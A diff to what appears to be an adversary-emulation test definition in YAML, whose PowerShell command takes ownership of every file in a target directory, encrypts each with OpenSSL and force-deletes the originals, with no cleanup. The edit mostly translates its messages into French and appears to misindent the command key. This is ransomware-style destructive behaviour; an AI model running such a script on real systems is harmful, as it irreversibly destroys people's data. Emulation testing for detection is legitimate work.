@@ -30,41 +30,47 @@ atomic_tests:
   executor:
     name: powershell
     elevation_required: true
-    command: |
-      $password = "#{encryption_password}"
-      $targetDir = "#{target_directory}"
-      
-      # Vérifier si le répertoire cible existe
-      if (-Not (Test-Path $targetDir)) {
-          Write-Host "Le répertoire cible $targetDir n'existe pas."
-          exit 1
+command: |
+  $password = "#{encryption_password}"
+  $targetDir = "#{target_directory}"
+
+  # Vérifier si le répertoire cible existe
+  if (-Not (Test-Path $targetDir)) {
+      Write-Host "Le répertoire cible $targetDir n'existe pas."
+      exit 1
+  }
+
+  Write-Host "Démarrage du chiffrement des fichiers dans $targetDir de manière récursive..."
+
+  # Prendre possession et modifier les permissions des fichiers
+  Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
+      $file = $_.FullName
+
+      # Afficher le fichier en cours de traitement
+      Write-Host "Traitement du fichier: $file"
+
+      # Prendre possession du fichier
+      Write-Host "Prendre possession du fichier: $file"
+      takeown /F $file /A
+      icacls $file /grant Administrators:F /T /C
+
+      # Chiffrer le fichier avec OpenSSL
+      $encryptedFile = "$file.enc"
+      Write-Host "Chiffrement du fichier: $file -> $encryptedFile"
+      openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
+
+      if ($LASTEXITCODE -eq 0) {
+          Write-Host "Fichier chiffré avec succès: $file -> $encryptedFile"
+
+          # Supprimer le fichier original après chiffrement réussi
+          Write-Host "Suppression du fichier original: $file"
+          Remove-Item -Path $file -Force
+          Write-Host "Fichier supprimé avec succès: $file"
+      } else {
+          Write-Host "Échec du chiffrement pour le fichier: $file"
       }
+  }
 
-      Write-Host "Encrypting files in $targetDir recursively..."
-
-      # Prendre possession et modifier les permissions des fichiers
-      Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
-          $file = $_.FullName
-
-          # Prendre possession du fichier
-          takeown /F $file /A
-          icacls $file /grant Administrators:F /T /C
-
-          # Chiffrer le fichier avec OpenSSL
-          $encryptedFile = "$file.enc"
-          openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
-          
-          if ($LASTEXITCODE -eq 0) {
-              Write-Host "Encrypted: $file -> $encryptedFile"
-              
-              # Supprimer le fichier original après chiffrement réussi
-              Remove-Item -Path $file -Force
-              Write-Host "Deleted: $file"
-          } else {
-              Write-Host "Failed to encrypt: $file"
-          }
-      }
-
-      Write-Host "Encryption and deletion process completed."
+  Write-Host "Processus de chiffrement et de suppression terminé."
     cleanup_command: |
       Write-Host "No cleanup performed for destructive actions."
